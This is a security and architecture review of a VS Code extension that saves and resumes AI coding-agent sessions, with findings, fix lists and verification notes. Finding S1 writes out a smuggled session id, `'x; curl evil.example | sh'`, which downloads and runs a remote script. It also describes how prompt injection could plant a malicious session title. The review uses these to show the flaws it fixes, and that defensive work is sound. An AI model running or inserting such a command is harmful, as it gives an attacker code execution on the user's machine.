# Architecture & Security Review — Agent Session Keeper

> **v0.0.3 verification — all follow-ups applied and verified (commits `9495ec9`/`91c27ab`).** Build ✅ · 167 unit tests ✅ · 16 integration tests ✅ · VSIX packages clean (13 files) ✅. The extension is publishable as-is. Remaining notes are defence-in-depth only (see the end of this section).

---

# v0.0.3 follow-up verification (commit `91c27ab`)

- **F1 ✅** `ensureStoragePermissions` (`src/store/storageDir.ts`) chmods the storage root, `sessions/`, `spool/`, `windows/`, `bin/` to 0700 once per activation; called from `activate()`; per-dir try/catch so a read-only dir never breaks activation. Covered by a new unit test that builds a 0755 tree and asserts the upgrade.
- **F2 ✅** `onDidCloseTerminal` now deletes the terminal from `terminalsByKey` before notifying the correlator. (Minor behavioural note: for a terminal the monitor never keyed, it now skips the correlator call entirely — equivalent, since the correlator would have found no binding.)
- **Spool rollover prune ✅** `poll()` re-prunes when the UTC date changes, not just at startup.
- **README ✅** Windows/PowerShell quoting note added.
- **PROGRESS.md ✅** follow-ups recorded.

Defence-in-depth observations (optional, not vulnerabilities):

1. `ensureStoragePermissions` upgrades the five top-level dirs but not `sessions/<agent>/` subdirs created by 0.0.1 (e.g. `sessions/claude` at 0755) — these are *effectively* protected because their parent `sessions/` is now 0700, which blocks traversal on POSIX. Walking `sessions/*` in the same loop would be belt-and-braces.
2. Existing record *files* stay 0644 until rewritten (a rewrite via `writeFileAtomic` produces a 0600 file). Unreachable behind the 0700 parents; optionally chmod files too in `ensureStoragePermissions`.
3. Ghost `pending` launcher records (agent binary missing) still surface as "interrupted" after restart — was marked optional and remains open.

---

# Part 0 — v0.0.2 verification (commit `8a0bb9c`)

Verified by the reviewer: `npm run build` ✅ · `npm test` (166 tests, +11 new) ✅ · `npm run test:integration` (16 tests) ✅ · `npm run package` ✅ (13 files, 29.78 KB VSIX) · diff `65a34e4..HEAD` reviewed line by line.

### Fix-list items 1–14: all correctly implemented

1. **S1+S2** ✅ `isSafeSessionId` (`src/model/types.ts`) rejects at capture (`Correlator.onHookEvent`/`onLaunch`/`onSessionFile`), resume (`Restorer`, new `'invalid'` outcome), copy (`SessionCommands.copy`) and transcript lookup (both adapters, plus `isUnder(projects)`). `shellQuote` (`src/util/shellQuote.ts`) single-quotes every template substitution and command names; the SAFE_TOKEN allowlist excludes `$`, backtick, `;`, `~`, `*`, `?`, whitespace — correct. Covered by `test/unit/shellQuote.test.ts` (injection payloads asserted round-trip as one shell word).
2. **S3** ✅ `writeFileAtomic` defaults to 0600 / dirs 0700; store, spool, heartbeat and installer all use it; installer re-chmod's the storage dir and `hook.js`.
3. **A3** ✅ settings.json now written via `writeJsonAtomic` under `withFileLock`; backup byte-identical restore logic preserved.
4. **A1** ✅ `WindowHeartbeat` (`src/restore/heartbeat.ts`) writes `windows/<sessionId>.json` every 30 s, fresh window = 90 s; `detectInterrupted` checks heartbeats before marking interrupted; stale files pruned; heartbeat removed on dispose. Ordering in `activate()` is safe (this window's own records are short-circuited by session id anyway).
5. **A4** ✅ every fire-and-forget callback (terminal start/end/close, session file, hook event, heartbeat, `startup.run()`) now catches and logs.
6. **A2** ✅ `HookSpoolReader` reads incrementally from per-file offsets with persistent handles (never the whole file), prunes spool files older than `agentSessions.spoolRetentionDays` (default 7, `minimum: 1`), handles closed on dispose.
7. **S4** ✅ fake agents exit non-zero without `CLAUDE_CONFIG_DIR`/`PI_CODING_AGENT_DIR`; the `.cmd` shims delegate to the same scripts, so Windows is covered too.
8. **P1** ✅ VSIX now contains only: `package.json`, `readme.md`, `LICENSE.txt`, `resources/` (hook.js, pi-extension.ts, icon.png, svg), `media/`, `dist/extension.js` — verified by unzipping the fresh package.
9. **P2** ✅ `repository`, `keywords`, 128×128 PNG `icon` (verified with sips), `LICENSE`, `preview: true`, `private` removed, `--allow-missing-repository` dropped.
10. **A5** ✅ Launcher writes `pending`; capture flips to `running`.
11. **A6** ✅ `bind()` returns archived records untouched instead of un-archiving; explicit resume still works (Restorer path).
12. **A7** ✅ `showTerminal` uses the bound terminal reference via `TerminalMonitor.terminalForSession`; name match is fallback only.
13. **S6** ✅ tree tooltip uses `appendText()` for title/cwd/branch.
14. **A8** ✅ pi extension spool-dir refactor (no more date-rollover race); the rest was explicitly optional and correctly left.

### New follow-ups (small, non-blocking)

- **F1 — existing storage keeps old permissions.** The 0700/0600 modes only apply to *newly created* dirs/files, and `chmod(storageDir)` runs only inside `HooksInstaller.install()`. A `~/.agent-sessions` created by 0.0.1 (like the owner's, verified: dirs 0755, records 0644) stays world-readable until the user runs Install Agent Hooks. Fix: run the idempotent `chmod(storageDir, 0o700)` (and `sessions/`, `spool/`) once per activation, e.g. in `resolveStorageDir`'s caller or `SessionStore.init()`, wrapped in try/catch.
- **F2 — `TerminalMonitor.terminalsByKey` never deletes entries.** Closed terminals stay in the map for the window's lifetime (small memory/reference leak; no correctness bug because the correlator clears `terminalSessions` on close, so lookup falls back to the name match). Fix: in the `onDidCloseTerminal` handler, `this.terminalsByKey.delete(this.keyFor(terminal))` alongside the correlator call.
- Cosmetic: `pruneOldFiles()` runs only at startup, not daily — fine for typical usage; a long-lived window with hooks running for weeks keeps accumulating one file per day in memory offsets only (files are still read incrementally). Optional: also prune on date rollover in `poll()`.
- Note for Windows users: `shellQuote` is POSIX/PowerShell-style quoting. Safe ids (the normal case) are passed unquoted so cmd.exe is fine; a title with spaces is single-quoted, which PowerShell (the VS Code default) handles correctly, cmd.exe would pass the quotes literally. Acceptable; worth one line in the README if Windows support matters.
- Ghost `pending` records (launcher ran, agent binary missing) will show as "interrupted" after the next restart and be offered for restore. A future nicety: mark `pending` records older than ~10 minutes with no session file as `missing` during `StartupRestore.run()`.

**Verdict: the security posture is now publishable.** No injection or traversal paths remain that the reviewer could find; the residual items are hygiene, not vulnerabilities.

---

# Original review of v0.0.1 (kept for reference; all items applied)

Review date: after milestone M7, commit `65a34e4` (repo matches `github.com/dbaralt/agent-session-keeper`).

**Verified by the reviewer:** `npm run build` ✅ · `npm test` (155 unit tests) ✅ · `npm run test:integration` (16 integration tests, fake agents, temp dirs) ✅ · inspected the packaged `agent-session-keeper-0.0.1.vsix` contents · read every file in `src/`, `resources/`, `media/`, `scripts/`, `test/bin/`, plus manifest and build config.

---

## Part 1 — Architecture review

### What is solid

- **Clean layering.** `agents/` (adapters + registry), `capture/` (monitor, watcher, spool, correlator), `store/` (atomic JSON store + lock), `restore/`, `ui/`, `import/` are well separated, and the `AgentAdapter` interface keeps agent specifics in two files. Adding an agent really is one file + one registry line.
- **Store correctness.** One JSON file per `agent/sessionId`, atomic tmp+rename writes, cross-process mkdir lock, field-level merge by `updatedAt`, and a debounce-refreshed `fs.watch` for cross-window visibility. There is a dedicated concurrency test that runs two real writer processes.
- **Input validation on disk reads.** `isSessionRecord` structural checks + `normalizeRecord` (only known keys are copied) + `sessionFileName()` sanitises session ids into safe filenames, so records read from disk cannot cause path traversal on write.
- **Graceful degradation everywhere.** Watchers fall back to non-recursive watch, the spool reader tolerates bad lines, hooks never fail the agent, the extension logs store init failure and keeps running.
- **No runtime dependencies, no network access, no telemetry.** Good for auditability and the marketplace.

### Findings (numbered for the fix list)

**A1 — Multi-window startup race falsely marks live sessions "interrupted" (correctness bug).**
`detectInterrupted` (`src/restore/interrupted.ts`) only knows about *this window's* terminals. When window B starts while window A has running sessions, B marks A's sessions `interrupted`, B's startup prompt offers to restore sessions that are still alive in A, and restoring them spawns duplicate agents. Window A eventually flips them back to `running` on the next transcript write, but until then both windows show wrong state. Fix: add a cheap liveness heartbeat — each window writes `<storageDir>/windows/<vscode.env.sessionId>.json` (mtime refreshed every ~30 s while the window lives) — and `detectInterrupted` treats records whose `launch.windowSessionId` maps to a *fresh* heartbeat as still running. Clean up stale heartbeats on activate.

**A2 — Unbounded spool growth and O(file) re-reads.**
`~/.agent-sessions/spool/events-YYYY-MM-DD.jsonl` is append-only and never pruned, and `HookSpoolReader.poll()` (`src/capture/HookSpoolReader.ts`) calls `readFile(file)` — the *whole* file — on every 500 ms poll of every spool file. A busy day of sessions makes each poll read and slice tens of MB. Fix: (a) open a persistent file handle per spool file and read incrementally from the stored offset (`fs.read` with a position), or at minimum keep the readFile but add (b) retention: on startup and daily, delete spool files whose date is older than N days (N = 7 by default, maybe a setting `agentSessions.spoolRetentionDays`).

**A3 — `settings.json` written non-atomically and without a lock.**
`HooksInstaller.installClaudeHooks`/`uninstallClaudeHooks` (`src/hooks/installer.ts`) write the user's `~/.claude/settings.json` with a plain `writeFile`. A crash or power loss mid-write corrupts the user's Claude config (the `.bak` only helps if the file still exists). Two VS Code windows running install/uninstall concurrently can also interleave. Fix: reuse `writeJsonAtomic` (it already exists in `src/store/atomicWrite.ts`) plus `withFileLock` on a `settings.json.lock`, same pattern as the session store.

**A4 — Unhandled promise rejections in event paths.**
`TerminalMonitor` (`void this.onStart(event)`), the `onEvent` callbacks wired in `extension.ts` (`void correlator.onSessionFile(...)`, `void correlator.onHookEvent(...)`), and `void startup.run()` all fire-and-forget. Any throw inside (e.g. a lock timeout from `withFileLock`, an EACCES) becomes an unhandled rejection logged by VS Code, and the failure is invisible to the user. Fix: wrap each callback body in try/catch that logs via `log().error(...)`; same for `startup.run()`.

**A5 — Launcher pre-commits a `running` record that may never exist.**
`Launcher.launch` writes a full record (status `running`) *before* the command executes. If the agent binary is missing or exits immediately, a ghost `running` record remains, which the startup flow later offers as "interrupted" and the resume flow then marks `missing`. Acceptable for a personal tool, but cheap to improve: write status `pending` and let capture flip it to `running` when the session file appears (the model already has a `pending` status; `SessionTreeProvider` already shows it under "Running").

**A6 — `bind()` unconditionally sets `status: 'running'`.**
An archived session that is resumed from a plain terminal (hook event or session file with a matching terminal) gets silently un-archived and its title can be overwritten (unless `titleSource === 'user'`). Decide: skip `bind` (fall back to `touchExisting`) for records with `status === 'archived'`, or document the behaviour.

**A7 — `showTerminal` matches terminals by `name.includes(record.title)`.**
`SessionCommands.showTerminalRecord` can reveal the wrong terminal when one title is a substring of another (the uniquifier makes `Session (2)` contain `Session`). Improve: keep a `vscode.Terminal` reference per bound terminal key in the correlator (or a `Map` from `sessionKey` to terminal) and show that exact terminal; keep the name match as fallback only.

**A8 — Small items (fix opportunistically).**
- `withFileLock` (`src/store/lock.ts`): two waiters can both `rm` a stale lock and both acquire. Low risk (both writers still merge field-level), but an easy hardening is to re-check `mkdir` immediately after stealing.
- `SessionStore.findKeyByPath` is an O(n) scan per file event; fine for hundreds of records, note only.
- `resources/pi-extension.ts`: `mkdirSync(join(spoolFile(), ".."))` calls `spoolFile()` twice (date could roll over between the two calls) and derives the dir from the *file* path. Compute the spool dir once and `join(dir, filename)` from it.
- `SessionDirWatcher.preload` and `importExisting.walk` walk every project dir under `~/.claude/projects` at startup — with a large history this is a slow first activation. Acceptable; consider lazy import.
- `store.init()` failure leaves the extension fully active with a broken store; every later store call throws. Consider a degraded mode flag (skip capture) or surfacing the error in the UI once.

---

## Part 2 — Security review

### What is solid

- **No `eval`, no `Function`, no dynamic `require`, no network code, no runtime deps.** The only `child_process` uses are `execFileSync('ps', ...)` in the hook bridge with fixed argv (no shell), and `spawnSync('code', ...)` in the sandbox script.
- **Webview is well built.** CSP restricts scripts to the webview origin, no `innerHTML` anywhere in `media/history.js` (all DOM built with `textContent`), messages are validated and switch-dispatched, `localResourceRoots` limited to `media/`.
- **Records read from disk are structurally validated** and filenames are sanitised, so a corrupted or hand-crafted record can't traverse paths on *write*.
- **The design keeps the user in control:** hooks are opt-in, uninstall is byte-identical to the pre-install state (verified by test), prompts-as-titles is an explicit setting with a secrets warning.

### Findings (numbered for the fix list)

**S1 — Shell injection through resume-command template substitution (highest priority).**
`applyResumeTemplate` (`src/agents/AgentAdapter.ts`) inserts `record.sessionId`, `record.cwd` and `record.title` **raw** into a command string, and `Restorer.resume` executes that string in the user's shell (`integration.executeCommand` / `terminal.sendText`). The values come from:
- `sessionId`: a launcher UUID (safe) — but also `explicitSessionId` parsed from *any* command line the shell-integration reports (a malicious workspace's `tasks.json` or script can run `claude --resume 'x; curl evil.example | sh'` in the integrated terminal, and the extension will faithfully record that id), and `session_id` from the **spool**, which any local process can append to.
- `title`: taken from the transcript (`customTitle`/`title`) or the **first prompt** — both can be influenced by prompt injection ("set the session title to ..."), so the title is not user-trusted text.

A crafted id or title containing `` ` ``, `$()`, `;` etc. ends up in `claude --resume <id>` and executes when the user clicks Resume. Fix (defence in depth, all three):
1. Validate session ids at capture time and at resume time: reject records whose `sessionId` doesn't match `/^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/` (real agents use UUIDs; this still allows file-friendly ids). Apply in `Correlator.bind`, `onHookEvent`, and as a guard in `Restorer.resume` + `SessionCommands.copy`.
2. Shell-quote every substitution in `applyResumeTemplate` (quote for POSIX sh: wrap in single quotes and escape embedded quotes; skip quoting only if the value matches the safe pattern above). `buildNewCommand`'s `JSON.stringify(name)` has the same gap for `$`/backticks — quote it too.
3. When `buildResumeCommand` output contains shell metacharacters *outside* the quoted parts, log it and show the command for confirmation before sending it to the terminal.

**S2 — Path traversal in transcript lookup via unsanitised `sessionId`.**
`createClaudeAdapter.transcriptPathFor` does `path.join(projects, dir, `${record.sessionId}.jsonl`)` with the raw record id; a record with `sessionId = '../../...'` (hand-edited or spool-injected) can make the extension read/open a `.jsonl` outside `~/.claude/projects`. Impact is minor (local read + display), but the same S1 validation fixes it; additionally, resolve the joined path and check it `isUnder` the projects root (pattern already exists in `SessionDirWatcher.isUnder`).

**S3 — Storage directory and files are created with default permissions (0755/0644).**
`~/.agent-sessions` holds session ids, cwds, git branches, terminal ids, and possibly prompt-derived titles (which the settings themselves warn may contain secrets). On a multi-user machine any local user can read them, and anyone who can write `storageDir/bin/hook.js` gets code execution inside every Claude session (the hook is invoked by Claude with the user's privileges). Fix: create the storage root, `sessions/`, `spool/` and `bin/` with mode `0700` (files `0600`), and make the installer `chmod 0700` an already-existing storage dir on install. Also verify the copied `hook.js` is `0755` but the dir is `0700`.

**S4 — Fake agents can fall back to writing real `~/.claude` / `~/.pi`.**
`test/bin/claude` and `test/bin/pi` use `process.env.CLAUDE_CONFIG_DIR || path.join(os.homedir(), '.claude')`. If someone runs them outside the sandbox/integration harness (env not set), they create fake project entries in the *real* agent config — violating the project's own safety rule. Fix: in both scripts, `if (!process.env.CLAUDE_CONFIG_DIR /* resp. PI_CODING_AGENT_DIR */) { console.error('refusing to run without CLAUDE_CONFIG_DIR pointing at a throwaway folder'); process.exit(1); }`.

**S5 — Hook installer trusts the storage dir from the env var at install time.**
`HooksInstaller` writes `node <storageDir>/bin/hook.js claude` into `settings.json`. If `AGENT_SESSIONS_STORAGE_DIR` points somewhere shared (a synced folder, a world-writable path), every Claude session will execute whatever lands at that path. Not exploitable remotely, but worth a guard: on install, warn if the resolved storage dir is not inside the user's home and/or not mode `0700`.

**S6 — Cosmetic injection surfaces (low, worth hardening anyway).**
- `SessionTreeProvider.tooltip` builds a `MarkdownString` from `record.title`/`cwd`. With `isTrusted` unset it can't run commands, but crafted titles can spoof formatting/links in the hover. Use `new MarkdownString(...)` with the text appended via `appendText()` for the untrusted parts, or escape backticks.
- `SessionCommands.copy` shows the built command in an information message — fine (it's a code span), but after S1 quoting this becomes a place to *show* the quoting.
- The hook bridge's `ps`-based ancestor walk can't work on Windows (`ps` missing) — not a security issue, capture then relies on `AGENT_SESSIONS_TERMINAL_ID`; document it.

**S7 — No security-relevant issues found in:** the webview (CSP + `textContent`), the lock/atomic-write code, the command tokenizer (it only *parses*, never executes), `importExisting` (read-only walk under agent roots), or the sandbox script (all data dirs overridden, `--reset` only touches `.sandbox/`).

---

## Part 3 — Publishing / packaging review

**P1 — Extra files ship in the VSIX.** The packaged `agent-session-keeper-0.0.1.vsix` contains `tsconfig.json`, `esbuild.mjs`, `PROGRESS.md`, `AGENTS.md`, `CLAUDE.md`, `START_HERE.md`. Add them to `.vscodeignore` (keep `readme.md`, `resources/`, `media/`, `dist/extension.js`, `resources/pi-extension.ts`).

**P2 — Marketplace metadata gaps in `package.json`:**
- no `repository` field (you already have `https://github.com/dbaralt/agent-session-keeper`; adding it also removes the need for `--allow-missing-repository`);
- no `icon` (marketplace requires a 128×128 PNG, not SVG);
- no `keywords`, no `LICENSE` file even though `license: MIT` is declared;
- remove `"private": true` — it's meaningless for a VSIX and some tooling treats it as non-distributable;
- consider `"preview": true` while at 0.x.

**P3 — `engines.vscode: ^1.93.0`** — correct for the stable `window.onDidStartTerminalShellExecution` API family you use; no change needed, just keep it in sync if you adopt newer APIs.

---

## Part 4 — Prioritised fix list for a coding agent

Apply in this order. Each item is independently committable.

1. **[S1+S2] Session-id validation + shell quoting of template substitutions.**
   - Add `isSafeSessionId(id)` (pattern above) to `src/model/types.ts`; reject in `Correlator.bind` / `onHookEvent` (drop the event, log a warning) and guard `Restorer.resume`, `SessionCommands.copy` and both adapters' `transcriptPathFor` (also `isUnder` check).
   - Add a `shellQuote()` helper (single-quote + `'\''` escaping for POSIX; no-op for values matching the safe pattern) and use it for `${sessionId}`, `${cwd}`, `${title}` in `applyResumeTemplate` and for the name in both `buildNewCommand`s. Unit-test: id/title containing `` ` ``, `$()`, `;`, quotes must survive round-trip as a single shell word.
2. **[S3] Restrictive permissions for storage.** `0700` for `~/.agent-sessions` (and `sessions/`, `spool/`, `bin/`), `0600` for record + spool files (`writeFileAtomic` gains an optional `mode`), installer re-chmods on install. Unit-test the created modes.
3. **[A3] Atomic + locked writes of `settings.json`** in `HooksInstaller` (reuse `writeJsonAtomic` + `withFileLock`). Add a concurrency test if cheap.
4. **[A1] Multi-window liveness heartbeat** (`windows/<sessionId>.json`, mtime refreshed on an interval, checked by `detectInterrupted`). Extend `test/unit/interrupted.test.ts`.
5. **[A4] try/catch every fire-and-forget event callback** (`TerminalMonitor.onStart`, both `onEvent` lambdas in `extension.ts`, `startup.run`) logging to the output channel.
6. **[A2] Spool retention + incremental reads.** Delete spool files older than `agentSessions.spoolRetentionDays` (default 7) on startup; switch `HookSpoolReader` to position-based `fs.read` or at least keep offsets per file handle. Test with a fake clock.
7. **[S4] Fake agents refuse to run without their env vars** (`test/bin/claude`, `test/bin/pi`, and the `.cmd` shims).
8. **[P1] `.vscodeignore`:** add `tsconfig.json`, `esbuild.mjs`, `PROGRESS.md`, `AGENTS.md`, `CLAUDE.md`, `START_HERE.md`, `REVIEW.md`.
9. **[P2] Manifest + repo hygiene:** add `repository`, `keywords`, `icon` (PNG), a `LICENSE` file, drop `private: true`; keep `--allow-missing-repository` only until `repository` is added.
10. **[A5] Launcher writes `pending`** until capture confirms the session file; flip to `running` in `bind`/`touchExisting`.
11. **[A6] Decide archived-on-resume behaviour** (recommend: `bind` skips archived records, falls through to `touchExisting`) and record it in `PROGRESS.md` under Decisions.
12. **[A7] `showTerminal` exact-match by stored terminal reference**, substring name match as fallback.
13. **[S6] Tooltip hardening:** build the `MarkdownString` with `appendText()` for title/cwd.
14. **[A8] Small hardenings:** stale-lock re-check after steal; `pi-extension.ts` spool-dir refactor; optional degraded-store mode.

**Explicitly not problems** (do not "fix"): the mkdir-based lock design, the global `~/.agent-sessions` default (owner-confirmed decision D2), JSON-per-record storage, polling spool reader (beyond item 6), the absence of Codex support (decision D4).
